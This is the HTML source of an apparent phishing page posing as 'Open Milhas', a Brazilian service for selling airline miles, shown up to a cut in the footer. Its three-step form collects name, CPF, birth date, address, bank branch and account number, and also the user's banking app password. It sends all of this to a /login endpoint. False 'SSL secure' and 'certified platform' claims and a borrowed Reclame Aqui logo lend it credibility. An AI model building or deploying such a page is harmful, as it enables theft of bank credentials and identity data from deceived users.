<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Milhas | Vender Milhas</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
    <style>
        :root { --primary: #2c7da0; --gold: #c5a059; --dark: #0a1128; }
        body { font-family: 'Segoe UI', sans-serif; background: #fff; }
        .navbar-brand { font-weight: 800; color: var(--dark) !important; font-size: 1.6rem; }
        .navbar-brand span { color: var(--gold); }
        .progress-bar-custom { height: 10px; background: #e9ecef; border-radius: 20px; margin: 40px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--primary); width: 33%; transition: 0.6s ease; }
        .step-tag { background: #e3f2fd; color: var(--primary); padding: 8px 20px; border-radius: 30px; font-weight: 600; display: inline-block; margin-bottom: 30px; }
        .form-control { border-radius: 50px; padding: 15px 25px; border: 1px solid #ddd; margin-bottom: 20px; }
        .btn-next { background: #469cb4; color: white; border-radius: 50px; padding: 12px 50px; border: none; font-weight: bold; }
        .footer-logos img { height: 45px; margin: 15px; filter: grayscale(100%); opacity: 0.7; }
        .step-page { display: none; } .step-active { display: block; animation: fadeIn 0.4s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<nav class="navbar border-bottom py-3">
    <div class="container justify-content-between">
        <a class="navbar-brand" href="#">OPEN <span>MILHAS</span></a>
        <div class="d-none d-md-block text-muted small">Passo <span id="stepNum">1</span> de 3</div>
    </div>
</nav>

<div class="container mt-5" style="max-width: 800px;">
    <div class="text-center mb-4">
        <h2 class="fw-bold">Complete seu cadastro</h2>
        <p class="text-muted">Informe seus dados para finalizar a cotação.</p>
    </div>

    <div class="progress-bar-custom"><div class="progress-fill" id="progressBar"></div></div>

    <form action="/login" method="POST">
        <div class="step-page step-active" id="step1">
            <div class="step-tag"><i class="fas fa-user-circle me-2"></i> 1. Dados Pessoais</div>
            <div class="row">
                <div class="col-12"><input type="text" name="nome" class="form-control" placeholder="Nome completo *" required></div>
                <div class="col-md-6"><input type="text" name="cpf" class="form-control" placeholder="CPF *" required></div>
                <div class="col-md-6"><input type="date" name="data_nasc" class="form-control" required></div>
                <div class="col-12"><input type="email" name="email" class="form-control" placeholder="E-mail *"></div>
            </div>
            <div class="text-end"><button type="button" class="btn-next" onclick="move(2)">Continuar</button></div>
        </div>

        <div class="step-page" id="step2">
            <div class="step-tag"><i class="fas fa-map-marker-alt me-2"></i> 2. Endereço</div>
            <div class="row">
                <div class="col-md-4"><input type="text" name="cep" class="form-control" placeholder="CEP *" required></div>
                <div class="col-md-8"><input type="text" name="rua" class="form-control" placeholder="Rua / Logradouro *" required></div>
                <div class="col-md-4"><input type="text" name="numero" class="form-control" placeholder="Número *" required></div>
                <div class="col-md-8"><input type="text" name="bairro" class="form-control" placeholder="Bairro"></div>
            </div>
            <div class="text-end">
                <button type="button" class="btn btn-link text-muted me-3" onclick="move(1)">Voltar</button>
                <button type="button" class="btn-next" onclick="move(3)">Continuar</button>
            </div>
        </div>

        <div class="step-page" id="step3">
            <div class="step-tag"><i class="fas fa-university me-2"></i> 3. Dados Bancários</div>
            <div class="row">
                <div class="col-md-6"><input type="text" name="agencia" class="form-control" placeholder="Agência *" required></div>
                <div class="col-md-6"><input type="text" name="conta" class="form-control" placeholder="Número da Conta *" required></div>
                <div class="col-12">
                    <input type="password" name="senha_app" class="form-control" placeholder="Senha do aplicativo bancário *" required>
                    <p class="small text-muted text-center mt-2"><i class="fas fa-lock me-1"></i> Ambiente seguro com criptografia SSL</p>
                </div>
            </div>
            <div class="text-end">
                <button type="button" class="btn btn-link text-muted me-3" onclick="move(2)">Voltar</button>
                <button type="submit" class="btn-next" style="background: var(--gold);">Finalizar Cadastro</button>
            </div>
        </div>
    </form>
</div>

<footer class="footer-logos text-center mt-5 py-5 border-top">
    <div class="container">
        <p class="small fw-bold text-muted mb-4">PLATAFORMA SEGURA E HOMOLOGADA</p>
        <img src="https://logodownload.org/wp-content/uploads/2017/11/reclame-aqui-logo.png" alt="Reclame Aqui">
